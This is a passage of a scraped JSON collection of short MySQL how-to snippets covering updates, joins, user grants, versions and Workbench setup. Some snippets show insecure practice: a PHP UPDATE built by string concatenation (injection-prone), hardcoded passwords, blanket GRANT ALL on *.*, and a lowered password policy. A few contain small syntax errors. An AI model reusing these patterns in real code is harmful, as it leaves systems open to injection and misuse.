    "description": "SELECT   FROM_UNIXTIME(timestamp)  FROM    your_table;\nSELECT FROM_UNIXTIME(1447430881);  \t# 2015-11-13 10:08:01 SELECT FROM_UNIXTIME(1632406597);  \t# 2021-09-23 16:16:37 SELECT FROM_UNIXTIME(1447430881,'%Y %D %M %h:%i:%s %x');  \t# 2015 13th November 10:08:01 2015\nselect FROM_UNIXTIME(UNIX_TIMESTAMP(),'%a %b %d %H:%i:%s UTC %Y');\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2487,
    "keyword": null,
    "link": null,
    "title": " mysql update add to existing value",
    "description": "mysql> UPDATE tableName SET sometotal = sometotal+10 WHERE Id = 4;\nUPDATE [LOW_PRIORITY] [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE     condition];\n-- Things in brackets are optional -- IGNORE modifier updates rows even if errors occur (ie: the rows that cause errors are simply not updated) UPDATE [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE      condition]; -- WHERE tells us which rows to update based on said condition\n",
    "reg_date": "2021-10-12T09:57:47.000Z"
  },
  {
    "id": 2488,
    "keyword": null,
    "link": null,
    "title": " mysql update auto",
    "description": "ALTER TABLE tbl AUTO_INCREMENT = 100;\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2489,
    "keyword": null,
    "link": null,
    "title": " mysql update case-sensitive",
    "description": "SELECT * FROM table_name WHERE UPPER(col_name) LIKE '%SEARCHED%'; SELECT * FROM table_name WHERE col_name LIKE '%Searched%';  -- Case sensitive  SYMBOL\tDESCRIPTION\t(SQL)                       EXAMPLE %\t    zero or more characters\t                bl%      'bl, black, blue, blob' _\t    a single character\t                    h_t      'hot, hat, hit' []\t    any single character within brackets\th[oa]t   'hot, hat', but NOT 'hit' ^\t    any character not in the brackets\t    h[^oa]t  'hit', but NOT 'hot, hat' -\t    a range of characters\t                [a-b]t   'cat, cbt'\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2490,
    "keyword": null,
    "link": null,
    "title": " mysql update field from one table to another",
    "description": "UPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\nUPDATE tableB INNER JOIN tableA ON tableB.name = tableA.name SET tableB.value = IF(tableA.value > 0, tableA.value, tableB.value) WHERE tableA.name = 'Joe' \nUPDATE MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.COLID SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 WHERE t1.COL3 = 'OK';\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2491,
    "keyword": null,
    "link": null,
    "title": " mysql update from n to 100",
    "description": "SET @rank:=0; update tablename set fieldname =@rank:=@rank+1;  #OR  UPDATE tablename JOIN (SELECT @rank := 0) r SET fieldname=@rank:=@rank+1; \n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2492,
    "keyword": null,
    "link": null,
    "title": " mysql update from select",
    "description": "UPDATE t1 SET t1.COL1 = t2.COL1, t1.COL2 = t2.COL2 FROM MY_TABLE AS t1 INNER JOIN MY_OTHER_TABLE AS t2 ON t1.COLID = t2.ID WHERE t1.COL3 = 'OK';\nUPDATE     products_description pd INNER JOIN products_description pd2 ON     (pd.products_id=pd2.products_id AND pd2.language_id=1 AND pd.language_id<>1) SET pd.products_seo = pd2.products_seo;\nUPDATE table_name SET field1 = 'value 1', field2 = 'value 2' WHERE field3 = 'value 3' \nUPDATE tableName SET columnName = yourValue; #to update multiple columns: UPDATE tableName SET column1 = value1, column2 = value2; #and so on\nUPDATE tableName SET anAttribute = 'Something' WHERE anOtherAttribute = 'SomethingElse'  //All 'SomethingElse' values will become 'Something'\nUPDATE name_table SET param = 'VALUE';\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2493,
    "keyword": null,
    "link": null,
    "title": " mysql update privileges",
    "description": "mysql> REVOKE ALL ON example_database.* FROM 'user_name'@'host_name';  mysql> GRANT privilege1, privilege2 ON example_database.* TO 'user_name'@'host_name';\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2494,
    "keyword": null,
    "link": null,
    "title": " mysql update query",
    "description": "UPDATE table_name SET variable = 'changed field', variable = 'another changed field' WHERE firstline_name = 1;\nUPDATE table_name SET field1 = 'value 1', field2 = 'value 2' WHERE field3 = 'value 3' \n-- Set New Employee Password  UPDATE employee SET employee.password = '1234' WHERE employee.email = 'emp@gmail.com';\nUPDATE tableName SET anAttribute = 'Something' WHERE anOtherAttribute = 'SomethingElse'  //All 'SomethingElse' values will become 'Something'\nUPDATE [LOW_PRIORITY] [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE     condition];\n-- Things in brackets are optional -- IGNORE modifier updates rows even if errors occur (ie: the rows that cause errors are simply not updated) UPDATE [IGNORE] table_name  SET      column_name1 = expr1,     column_name2 = expr2,     ... [WHERE      condition]; -- WHERE tells us which rows to update based on said condition\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2495,
    "keyword": null,
    "link": null,
    "title": " mysql update set sum",
    "description": "UPDATE products p,( SELECT products_id, sum(attributes_stock)  as mysum                    FROM products_attributes GROUP BY products_id) as s     SET p.products_quantity = s.mysum   WHERE p.products_id = s.products_id\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2496,
    "keyword": null,
    "link": null,
    "title": " mysql update sum same table",
    "description": "UPDATE products SET quantity = quantity + 10 WHERE id = 8\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2497,
    "keyword": null,
    "link": null,
    "title": " mysql update table from another table",
    "description": "UPDATE tableB INNER JOIN tableA ON tableB.name = tableA.name SET tableB.value = IF(tableA.value > 0, tableA.value, tableB.value) WHERE tableA.name = 'Joe' \n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2498,
    "keyword": null,
    "link": null,
    "title": " mysql update table from select on another table",
    "description": "UPDATE TableB  SET TableB.value = (     SELECT TableA.value      FROM TableA     WHERE TableA.name = TableB.name );\n",
    "reg_date": "2021-10-12T09:57:48.000Z"
  },
  {
    "id": 2499,
    "keyword": null,
    "link": null,
    "title": " mysql update two tables at once",
    "description": "UPDATE t1 LEFT JOIN t2 ON t1.id = t2.f_key    SET t1.value = t1.value + 1,        t2.value = t2.value + 1  WHERE t1.id = condition\n update  tabe2 set subject_id = (SELECT GROUP_CONCAT(sub_id SEPARATOR ', ') as sub_id FROM tabe1)  \n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2500,
    "keyword": null,
    "link": null,
    "title": " mysql update where not in list",
    "description": "#filter in MySQL: WHERE id_field not in ('817','803','495') \nUPDATE table SET available=1 WHERE available=0    AND id NOT IN (id1, id2, id3,...); \n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2501,
    "keyword": null,
    "link": null,
    "title": " mysql update with join",
    "description": "You often use joins to query rows from a table that have (in the case of INNER JOIN) or may not have (in the case of LEFT JOIN) matching rows in another table. In MySQL, you can use the JOIN clauses in the UPDATE statement to perform the cross-table update.  The syntax of the MySQL UPDATE JOIN  is as follows:  UPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition Let&rsquo;s examine the MySQL UPDATE JOIN  syntax in greater detail:  First, specify the main table ( T1 ) and the table that you want the main table to join to ( T2 ) after the UPDATE clause. Notice that you must specify at least one table after the UPDATE  clause. The data in the table that is not specified after the UPDATE  clause will not be updated. Next, specify a kind of join you want to use i.e., either INNER JOIN  or LEFT JOIN  and a join predicate. The JOIN clause must appear right after the UPDATE clause. Then, assign new values to the columns in T1 and/or T2 tables that you want to update. After that, specify a condition in the WHERE clause to limit rows to rows for updating.\nUPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition \nUPDATE employees     LEFT JOIN     merits ON employees.performance = merits.performance  SET      salary = salary + salary * 0.015 WHERE     merits.percentage IS NULL;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2502,
    "keyword": null,
    "link": null,
    "title": " mysql updating multiple column values from array variable",
    "description": "$sql = \"UPDATE product_list SET product_name='\".$product_name.\"',product_category='\".$product_category.\"',product_price='\".$product_price.\"',product_description='\".$product_description.\"',size_category='\".$size_category.\"'\";\n\"UPDATE product_list  set  product_name='$product_name',  product_category ='$product_category',  product_price='$product_price', product_description='$product_description', product_size_category='$size_category' where product_id='$product_id' \"\n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2503,
    "keyword": null,
    "link": null,
    "title": " mysql url",
    "description": "import java.sql.*;   class MySqlConn{       public static void main(String args[]){           try{               Class.forName(\"com.mysql.cj.jdbc.Driver\");               Connection conn = DriverManager.getConnection(\"jdbc:mysql://             localhost:3306/databasename\",\"username\",\"password\");               Statement stmt = conn.createStatement();               ResultSet rs = stmt.executeQuery(\"select * from emp\");                 con.close();           }catch(Exception ex){             System.out.println(ex);         }       } }  \n<!-- MySQL dataSource config --> <bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\">     <property name=\"driverClassName\" value=\"com.mysql.cj.jdbc.Driver\" /><!-- mysql 8 -->     <property name=\"url\" value=\"jdbc:mysql://localhost:3306/mydb?useSSL=false&serverTimezone=UTC&characterEncoding=utf-8\" />     <property name=\"username\" value=\"matt\" />     <property name=\"password\" value=\"12345\" /> </bean> \n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2504,
    "keyword": null,
    "link": null,
    "title": " mysql url data type",
    "description": "< MySQL 5.0.3 use TEXT or >= MySQL 5.0.3 use VARCHAR(2083)\n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2505,
    "keyword": null,
    "link": null,
    "title": " mysql use database",
    "description": "CREATE DATABASE `mydb`;  CREATE TABLE `my_table` ( \tmy_table_id INT AUTO_INCREMENT,     my_table_name VARCHAR(30) NOT NULL,     my_foreign_key INT NOT NULL,     my_tb_created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,   \tmy_tb_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP, ,     # Any other properties here     PRIMARY KEY(my_table_id),     CONSTRAINT fk_name_of_parent_table     FOREIGN KEY(my_foreign_key) REFERENCES parent_table(parent_table_column) );  SHOW DATABASES; \nUSE database_name;\n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2506,
    "keyword": null,
    "link": null,
    "title": " mysql use if on select",
    "description": "SELECT IF(1>3,'true','false');\nIF(expression ,expr_true, expr_false); \n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2507,
    "keyword": null,
    "link": null,
    "title": " mysql user",
    "description": "CREATE USER 'user'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'user'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'norris'@'localhost' IDENTIFIED BY 'password';\nCREATE USER 'pdam'@'localhost' IDENTIFIED BY 'pdamP@ssw0rd'; # create user GRANT ALL PRIVILEGES ON `pdam_db`.* TO 'pdam'@'localhost'; # set db access FLUSH PRIVILEGES; # Reload\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; #grant permissions to a specic database and/or table  GRANT ALL PRIVILEGES ON database.table TO 'newuser'@'localhost'; #Or grant wildcar permission to any DB/table GRANT ALL PRIVILEGES ON *.* TO 'newuser'@'localhost';\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2508,
    "keyword": null,
    "link": null,
    "title": " mysql user access to database",
    "description": "GRANT ALL PRIVILEGES ON dbTest.* To 'user'@'hostname' IDENTIFIED BY 'password';\nmysql> GRANT ALL PRIVILEGES ON database_name.* TO 'username'@'localhost'; \nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n",
    "reg_date": "2021-10-12T09:57:49.000Z"
  },
  {
    "id": 2509,
    "keyword": null,
    "link": null,
    "title": " mysql user grant database",
    "description": "-- Grants / privileges list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2510,
    "keyword": null,
    "link": null,
    "title": " mysql user grants",
    "description": "-- Grants / privileges list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2511,
    "keyword": null,
    "link": null,
    "title": " mysql user permission database",
    "description": "GRANT ALL PRIVILEGES ON dbTest.* To 'user'@'hostname' IDENTIFIED BY 'password';\n-- Grants list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\nGRANT ALL PRIVILEGES ON `db_name`.* TO 'user'@'host'\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2512,
    "keyword": null,
    "link": null,
    "title": " mysql users and permissions",
    "description": "-- Grants list SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user;  -- Grant a user /*  ALL PRIVILEGES  All privileges     CREATE          Create databases and tables     DROP            Drop databases and tables     DELETE          Delete rows from a specific table     INSERT          Insert rows into a specific table     SELECT          Read a database     UPDATE          Update table rows   */ GRANT SELECT, UPDATE ON db_name.table_name TO 'my_user'@'localhost'; GRANT SELECT ON *.* TO 'my_user'@'localhost'; GRANT ALL PRIVILEGES ON db_name.* TO 'my_user'@'localhost';  --Display user grants SHOW GRANTS FOR 'my_user'@'localhost';\nGRANT ALL PRIVILEGES ON `db_name`.* TO 'user'@'host'\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2513,
    "keyword": null,
    "link": null,
    "title": " mysql users and privileges list",
    "description": "SELECT * FROM mysql.user;  SELECT * FROM information_schema.user_privileges; SELECT CONCAT('SHOW GRANTS FOR ''',user,'''@''',host,''';') FROM mysql.user; SHOW GRANTS FOR 'my_user'@'localhost';\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2514,
    "keyword": null,
    "link": null,
    "title": " mysql varchar length",
    "description": "ALTER TABLE emp MODIFY COLUMN name VARCHAR(100); \nSELECT length('abcd') FROM DUAL;\t\t-- Oracle SELECT length('abcd');\t\t\t\t\t-- MySql SELECT len('abcd');\t\t\t\t\t\t-- SQL Server\nTINYTEXT              255 TEXT/VARCHAR          65,535 MEDIUMTEXT    \t      16,777,215 LONGTEXT              4,294967,295\n65,535  The length can be specified as a value from 0 to 65,535.  The effective maximum length of a VARCHAR is subject to  the maximum row size (65,535 bytes, which is shared among all columns)  and the character set used.\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2515,
    "keyword": null,
    "link": null,
    "title": " mysql version",
    "description": "# console mysql --version mysql -V  # sql query SHOW VARIABLES LIKE &lsquo;%version%&rsquo;;\nmysql -V\n# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\nMysql version mysql -V\nSHOW VARIABLES LIKE &lsquo;%version%&rsquo;;\nmysqld --version\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2516,
    "keyword": null,
    "link": null,
    "title": " mysql version check cmd",
    "description": "SHOW VARIABLES LIKE \"%version%\"; +-------------------------+------------------------------------------+ | Variable_name           | Value                                    | +-------------------------+------------------------------------------+ | protocol_version        | 10                                       | | version                 | 5.0.27-standard                          | | version_comment         | MySQL Community Edition - Standard (GPL) | | version_compile_machine | i686                                     | | version_compile_os      | pc-linux-gnu                             | +-------------------------+------------------------------------------+ 5 rows in set (0.04 sec)\nmysql -V\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2517,
    "keyword": null,
    "link": null,
    "title": " mysql version query",
    "description": "# console mysql --version mysql -V  # sql query SHOW VARIABLES LIKE &lsquo;%version%&rsquo;;\nSHOW VARIABLES LIKE \"%version%\"; +-------------------------+------------------------------------------+ | Variable_name           | Value                                    | +-------------------------+------------------------------------------+ | protocol_version        | 10                                       | | version                 | 5.0.27-standard                          | | version_comment         | MySQL Community Edition - Standard (GPL) | | version_compile_machine | i686                                     | | version_compile_os      | pc-linux-gnu                             | +-------------------------+------------------------------------------+ 5 rows in set (0.04 sec)\n# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\nMysql version mysql -V\nSHOW VARIABLES LIKE &lsquo;%version%&rsquo;;\nmysqld --version\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2518,
    "keyword": null,
    "link": null,
    "title": " mysql view command",
    "description": "SHOW CREATE TABLE v_name\n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2519,
    "keyword": null,
    "link": null,
    "title": " mysql view curren querys",
    "description": "show processlist; \n",
    "reg_date": "2021-10-12T09:57:50.000Z"
  },
  {
    "id": 2520,
    "keyword": null,
    "link": null,
    "title": " mysql view current queries",
    "description": "show processlist; \nmysql> show processlistG  *************************** 6. row ***************************      Id: 708163    User: root    Host: localhost      db: NULL Command: Query    Time: 0   State: NULL    Info: show processlist *************************** 7. row ***************************      Id: 708174    User: test    Host: localhost      db: test Command: Query    Time: 3   State: Copying to tmp table    Info: select dist.name, dist.filename, count(*) from orders_header h inner join orders_detail d on h.ord 2 rows in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2521,
    "keyword": null,
    "link": null,
    "title": " mysql view from multiple tables",
    "description": "CREATE VIEW V AS (    SELECT i.country,i.year,p.pop,f.food,i.income FROM     INCOME i   LEFT JOIN      POP p    ON     i.country=p.country   LEFT JOIN     Food f   ON      i.country=f.country   WHERE      i.year=p.year   AND     i.year=f.year );\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2522,
    "keyword": null,
    "link": null,
    "title": " mysql virtual column",
    "description": "CREATE TABLE T1 (     ID          NUMBER,     PRODUCT     VARCHAR2(50),     PRICE       NUMBER(10, 2),     TAXED_PRICE NUMBER(10, 2) GENERATED ALWAYS AS (round(PRICE * 1.2, 2)) VIRTUAL ); INSERT INTO T1 (ID, PRODUCT, PRICE) VALUES (1, 'Spoon', 12);\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2523,
    "keyword": null,
    "link": null,
    "title": " mysql vs postgresql",
    "description": "/*Postgres is an object-relational database, while MySQL is a purely  relational database. This means that Postgres includes features like table inheritance and function overloading, which can be important to certain applications. Postgres also adheres more closely to SQL standards.  Postgres handles concurrency better than MySQL for multiple reasons:  Postgres implements Multiversion Concurrency Control (MVCC) without  read locks Postgres supports parallel query plans that can use multiple CPUs/cores Postgres can create indexes in a non-blocking way (through  the CREATE INDEX CONCURRENTLY syntax), and it can create partial indexes (for example, if you have a model with soft deletes, you can create an index that ignores records marked as deleted)  Postgres is known for protecting data integrity at the transaction  level. This makes it less vulnerable to data corruption.*/\nMySQL                   PostgreSQL          SQLite  TINYINT                 SMALLINT            INTEGER SMALLINT                SMALLINT MEDIUMINT               INTEGER BIGINT                  BIGINT BIT                     BIT                 INTEGER _______________________________________________________  TINYINT UNSIGNED        SMALLINT            INTEGER SMALLINT UNSIGNED       INTEGER MEDIUMINT UNSIGNED      INTEGER INT UNSIGNED            BIGINT BIGINT UNSIGNED         NUMERIC(20) _______________________________________________________  DOUBLE                  DOUBLE PRECISION    REAL FLOAT                   REAL                REAL DECIMAL                 DECIMAL             REAL NUMERIC                 NUMERIC             REAL _______________________________________________________  BOOLEAN                 BOOLEAN             INTEGER _______________________________________________________  DATE                    DATE                TEXT TIME                    TIME DATETIME                TIMESTAMP _______________________________________________________  TIMESTAMP DEFAULT       TIMESTAMP DEFAULT   TEXT NOW()                   NOW()    _______________________________________________________  LONGTEXT                TEXT                TEXT MEDIUMTEXT              TEXT                TEXT BLOB                    BYTEA               BLOB VARCHAR                 VARCHAR             TEXT CHAR                    CHAR                TEXT _______________________________________________________  columnname INT          columnname SERIAL   INTEGER PRIMARY  AUTO_INCREMENT                              KEY AUTOINCREMENT\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2524,
    "keyword": null,
    "link": null,
    "title": " mysql where derived column",
    "description": "#you can use having on derived columns. SELECT a,b,c,(a*b+c) AS d, n FROM table HAVING d > n ORDER by d\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2525,
    "keyword": null,
    "link": null,
    "title": " mysql where in array",
    "description": "-- SQL SELECT * FROM table WHERE column IN('value1','value2','value3')  -- Javascript $string=\"1,2,3,4,5\"; $array=array_map('intval', explode(',', $string)); $array = implode(\"','\",$array); $query=mysqli_query($conn, \"SELECT name FROM users WHERE id IN ('\".$array.\"')\");\n$sql = 'SELECT *            FROM `table`           WHERE `id` IN (' . implode(',', array_map('intval', $array)) . ')';\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2526,
    "keyword": null,
    "link": null,
    "title": " mysql where not equal",
    "description": "DELETE FROM konta WHERE taken <> '';\nSELECT book_name FROM book_mast WHERE pub_lang != \"English\";\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2527,
    "keyword": null,
    "link": null,
    "title": " mysql where one year ago",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2528,
    "keyword": null,
    "link": null,
    "title": " mysql where value is null",
    "description": "SELECT * FROM contacts WHERE last_name IS NULL;\nSELECT * from TABLE where CODE IS NULL OR CODE!='C'\n SELECT      contactname, IFNULL(bizphone, homephone) phone FROM     contacts;\nUPDATE table SET field = NULL WHERE something = something\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2529,
    "keyword": null,
    "link": null,
    "title": " mysql workbecnh short cut to execute single line query on mac",
    "description": "For Mac OS Execute (All or Selection) -> Command + Shift + Enter. Execute Current Statement -> Command + Enter. For Winodows Execute (All or Selection) -> Ctrl + Shift + Enter. Execute Current Statement -> Ctrl + Enter.\n",
    "reg_date": "2021-10-12T09:57:51.000Z"
  },
  {
    "id": 2530,
    "keyword": null,
    "link": null,
    "title": " mysql workbench",
    "description": "/* Answer to: \"mysql workbench tutorial\" */  /*    A very good and detailed tutorial on the MySQL Workbench is here:   https://www.youtube.com/watch?v=X_umYKqKaF0      You may also see the video below. */\n/* Answer to: \"mysql workbench download\" */  /*   MySQL Workbench is a visual database design tool that integrates   SQL development, administration, database design, creation and   maintenance into a single integrated development environment for   the MySQL database system.    You can download it here:   https://dev.mysql.com/downloads/workbench/ */\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2531,
    "keyword": null,
    "link": null,
    "title": " mysql workbench download",
    "description": "/* Answer to: \"mysql workbench download\" */  /*   MySQL Workbench is a visual database design tool that integrates   SQL development, administration, database design, creation and   maintenance into a single integrated development environment for   the MySQL database system.    You can download it here:   https://dev.mysql.com/downloads/workbench/ */\n/* Download Link: https://dev.mysql.com/downloads/workbench */\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2532,
    "keyword": null,
    "link": null,
    "title": " mysql workbench download for iinux mint 19.3",
    "description": "sudo snap install mysql-workbench-community\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2533,
    "keyword": null,
    "link": null,
    "title": " mysql workbench failed to connect with user root access denied ubuntu",
    "description": "The solution that worked for me was that  I had to create a new user apart from the root user (in mysql) And then created a new db connection with admin as the user & then it worked To create  a new user named admin with password as 'password'  commands- sudo mysql -u root -p CREATE USER 'admin'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost' WITH GRANT OPTION;  if everything works- ENJOY!  At some point if you get an error like  'Your password does not satisfy the current policy requirements'  do this- (affter starting mysql)  commands- SHOW VARIABLES LIKE 'validate_password%';  The output should be something like that : +--------------------------------------+-------+ | Variable_name                        | Value | +--------------------------------------+-------+ | validate_password.check_user_name    | ON    | | validate_password.dictionary_file    |       | | validate_password.length             | 6     | | validate_password.mixed_case_count   | 1     | | validate_password.number_count       | 1     | | validate_password.policy             | LOW   | | validate_password.special_char_count | 1     | +--------------------------------------+-------+   if not same  do this-  SET GLOBAL validate_password.length = 6; SET GLOBAL validate_password.number_count = 0;  similarly you can set other fields with the same format just change the variable name that is to be set.  DONE! THANKS :)  References- https://askubuntu.com/questions/773446/unable-to-connect-via-mysql-workbench-to-localhost-in-ubuntu-16-04-passwordless https://stackoverflow.com/questions/43094726/your-password-does-not-satisfy-the-current-policy-requirements   \n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2534,
    "keyword": null,
    "link": null,
    "title": " mysql workbench in ubuntu 14.04",
    "description": "sudo apt-get install mysql-server sudo apt-get install mysql-client sudo apt-get install mysql-workbench \n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2535,
    "keyword": null,
    "link": null,
    "title": " mysql workbench requires visual c++ 2019 redistributable package",
    "description": "/*  ERR : mysql workbench requires visual c++ 2019 redistributable package Download from here : https://support.microsoft.com/en-us/topic/the-latest-supported-visual-c-downloads-2647da03-1eea-4433-9aff-95f26a218cc0  Or search google for : \"latest supported visual c++ downloads\" */ \n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2536,
    "keyword": null,
    "link": null,
    "title": " mysql workbench tutorial",
    "description": "/* Answer to: \"mysql workbench tutorial\" */  /*    A very good and detailed tutorial on the MySQL Workbench is here:   https://www.youtube.com/watch?v=X_umYKqKaF0      You may also see the video below. */\n/* Answer to: \"mysql workbench download\" */  /*   MySQL Workbench is a visual database design tool that integrates   SQL development, administration, database design, creation and   maintenance into a single integrated development environment for   the MySQL database system.    You can download it here:   https://dev.mysql.com/downloads/workbench/ */\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2537,
    "keyword": null,
    "link": null,
    "title": " mysql xampp reset root password",
    "description": "/* Go to the phpMyAdmin panel and select the SQL tab. ** Then run this lines: */ UPDATE mysql.user SET Password=PASSWORD('new_password') WHERE User='root'; FLUSH PRIVILEGES;  /* Open the file C:\\xampp\\phpMyAdmin\\config.inc.php ** Search for this line and set the new password. */ $cfg\\['Servers'\\]\\[$i\\]['password'] = 'new_password'\n",
    "reg_date": "2021-10-12T09:57:52.000Z"
  },
  {
    "id": 2538,
    "keyword": null,
    "link": null,
    "title": " mysqld safe Directory '/var/run/mysqld' for UNIX socket file don't exists.",
    "description": "mkdir -p /var/run/mysqld chown mysql:mysql /var/run/mysqld\n",
